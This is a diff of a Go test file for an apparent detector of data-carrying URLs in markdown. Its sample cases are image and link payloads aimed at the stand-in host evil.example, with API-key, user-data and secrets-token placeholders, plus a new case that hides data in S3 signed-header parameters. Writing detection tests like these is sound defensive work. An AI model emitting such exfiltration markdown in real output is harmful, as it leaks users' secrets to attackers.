@@ -105,6 +105,8 @@ func TestDataCarryingURLs(t *testing.T) {
 		"key upper placeholder": "![x](https://evil.example/p.png?YOUR_API_KEY=1)",
 		"key angle link":        "[click](https://evil.example/?<your_data>=1)",
 		"key encoded template":  "[click](https://evil.example/?%7B%7Bsecrets.TOKEN%7D%7D=1)",
+		// SignedHeaders lists only known header names, so free text there is data.
+		"signed headers data": "![x](https://bucket.s3.amazonaws.com/a.png?X-Amz-SignedHeaders=host;" + strings.Repeat("abcdefgh", 4) + ";" + strings.Repeat("ijklmnop", 4) + "&X-Amz-Signature=" + hex64 + ")",
 		// A signed provider URL with plain data beside it is still High.
 		"signed plus data": "![x](https://d111.cloudfront.net/p.png?Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F&v=" + b64 + ")",
 		// Keys are decoded before the data-key check; the length bounds are
